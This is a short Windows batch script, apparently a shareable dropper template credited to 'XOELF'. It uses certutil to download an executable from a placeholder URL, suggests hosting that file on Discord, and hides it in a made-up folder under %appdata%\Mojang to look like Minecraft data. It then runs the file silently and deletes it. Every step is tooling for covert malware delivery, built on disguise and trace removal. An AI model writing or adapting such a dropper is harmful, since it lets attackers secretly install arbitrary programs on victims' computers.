@echo off
:start
title YOUR TITLE HERE
del %file%
color F0
cd
cls
echo CREDIT: XOELF
echo Github: @xoElf
echo Twitter: @xoElfy
echo YouTube: xoElf
echo Discord: Elf#0779
echo press any key to start...
pause>nul
md %appdata%\Mojang\seagull\turtle\apple >nul
cls
::LINK TO THE DIRECT DOWNLOAD GOES BELOW! (I suggest uploading it to discord and using "copy download link" to get the direct download link)
set url=https://YOURURLGOES.HERE/FILENAME.EXE >nul
::NAME OF THE FILE GOES BELOW!
set file=FILENAME.EXE >nul
certutil -urlcache -split -f %url% %file% >nul
cls
set path=%appdata%\Mojang\Seagull\Turtle\Apple
cls
move %file% %path%\%file% >nul
cd %path% >nul
%file% >nul
del %file% >nul
cls
echo FINISHED! PRESS ANY KEY TO EXIT!
pause>nul
cd %path% >nul
del %file% >nul
exit